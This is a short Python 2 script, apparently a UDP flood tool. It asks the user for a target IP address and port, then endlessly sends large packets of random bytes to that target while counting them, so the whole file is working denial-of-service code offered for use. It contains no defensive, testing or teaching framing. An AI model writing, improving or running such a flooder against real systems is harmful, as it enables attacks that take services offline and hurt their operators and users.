import sys
import os
import socket
import random
import platform

R = '\033[31m'
G = '\033[32m'
C = '\033[36m'
W = '\033[0m'

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

bytes = random._urandom(2200)
bytes1 = random._urandom(2900)
system = platform.uname()[0]

def cls():
    if system == 'Windows':
      os.system("cls")
    elif system == 'Linux':
        os.system("clear")

cls()

try:
   os.system("python src/logo.py")
   ip = raw_input("While IP Target : ")
   port = input("While the Port : ")
   os.system("python3 src/Starter.py")
except SyntaxError:
      print(R + '[-] ' + C + 'Error code: 422 Unprocessable Entity')

sent = 0
try:
   while True:
        sock.sendto(bytes, (ip,port))
        sent = sent + 1
        
        print "Sending %s packet to %s throught port:%s"%(sent,ip,port)
        
        while True:
             sock.sendto(bytes1, (ip,port))
             sent = sent + 1
             
             print "Sending %s packet to %s throught port:%s"%(sent,ip,port)
             
except KeyboardInterrupt:
      print('\n' + R + '[!]' + C + ' Keyboard Interrupt! Terminaling...' + W)
      
except socket.gaierror:
      print(R + '[-] ' + C + 'No address associated with hostname! Unknown Adress')
      print(R + '[-] ' + C + 'please write the working IP address!')
      
except NameError:
      print(R + '[-] ' + C + 'No address associated with hostname! Unknown Adress')
      print(R + '[-] ' + C + 'please write the working IP address!')
      
      
      
